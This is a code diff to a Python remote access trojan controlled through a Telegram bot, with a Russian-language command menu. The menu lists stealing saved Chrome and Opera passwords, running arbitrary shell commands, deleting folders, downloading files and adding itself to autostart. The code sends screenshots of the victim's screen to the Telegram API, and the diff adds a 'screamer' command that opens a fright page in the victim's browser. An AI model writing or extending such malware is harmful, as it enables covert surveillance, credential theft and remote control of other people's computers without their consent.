@@ -24,7 +24,7 @@ def send_message(command):
     
 @bot.message_handler(commands=['help', 'commands', 'Help', 'Commands']) # Commands
 def send_message(command):
-    bot.send_message(chat_id, "Команды: \n /Screen - Скриншот экрана \n /Info - Инфо о юзере \n /kill_process name.exe - Убить процесс по имени" +
+    bot.send_message(chat_id, "Команды: \n /Screen - Скриншот экрана \n /Info - Инфо о юзере \n /screamer - откроет ссылку на скример \n /kill_process name.exe - Убить процесс по имени" +
                     "\n /Pwd - Узнать текущую директорию \n /autostart - Добавить ратник в автостарт \n /passwords chrome - Пароли гугл хром \n /passwords opera - Пароли опера" +
                     "\n /Cmd command - Выполнить команду в cmd  \n /Open_url - Открыть ссылку \n /Ls - все папки и файлы в директории" +
                     "\n /Cd folder - перейти в папку \n /Download - скачать файл \n /Rm_dir - удалить папку" + 
@@ -40,8 +40,14 @@ def send_screen(command) :
     files = {'photo': screen} 
     requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=files) 
 
+@bot.message_handler(commands=['screamer', 'Screamer']) 
+def send_screamer(command) :
+    bot.send_message(chat_id, "Wait...") 
+    webbrowser.open('https://parad1st.github.io/Screamer/', new=2)
+    bot.send_message(chat_id, "Successfully open screamer") 
+
 @bot.message_handler(commands=['autostart', 'Autostart']) 
-def send_screen(command) :
+def send_autostart(command) :
     bot.send_message(chat_id, "Wait...") 
     Thisfile = sys.argv[0] 
     Thisfile_name = os.path.basename(Thisfile) 
